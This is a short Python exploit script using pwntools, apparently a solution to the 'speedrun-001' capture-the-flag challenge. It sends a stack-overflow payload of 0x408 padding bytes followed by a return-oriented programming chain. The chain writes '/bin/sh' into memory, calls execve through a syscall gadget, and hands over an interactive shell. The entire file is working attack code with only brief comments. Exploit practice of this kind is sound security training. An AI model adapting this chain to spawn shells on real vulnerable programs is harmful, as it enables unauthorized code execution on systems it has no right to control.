#!/usr/bin/env python3
from pwn import *

frame_size = 0x408

execve_syscall_number = 59
string_address = 0x6b6000
program_name = b"/bin/sh\x00"

pop_rax_gadget = 0x415664
pop_rdi_gadget = 0x400686
pop_rsi_gadget = 0x4101f3
pop_rdx_gadget = 0x4498b5
syscall_gadget = 0x40129c
mov_rax_rdx_gadget = 0x48d251

context.terminal = ["alacritty", "-e", "bash", "-c"] 
pr = pwnlib.gdb.debug("./speedrun-001")

# Padding to reach the saved return address
payload = b"\x00" * frame_size

'''
    Writing the string "/bin/sh\x00" to memory
    pop rax     <--- The string address
    pop rdx     <--- The string literal
    mov qword ptr [rax], rdx
'''
payload += p64(pop_rax_gadget)
payload += p64(string_address)
payload += p64(pop_rdx_gadget)
payload += program_name # TODO check both
payload += p64(mov_rax_rdx_gadget)


'''
    Execute syscall
    pop rax     <---- 59 (execve)
    pop rdi     <---- string address
    pop rsi     <---- eventual arguments: 0
    pop rdx     <---- eventual ambient variables: 0
    syscall
'''
payload += p64(pop_rax_gadget)
payload += p64(execve_syscall_number)
payload += p64(pop_rdi_gadget)
payload += p64(string_address)
payload += p64(pop_rsi_gadget)
payload += p64(0)
payload += p64(pop_rdx_gadget)
payload += p64(0)
payload += p64(syscall_gadget)

pr.send(payload)
pr.interactive()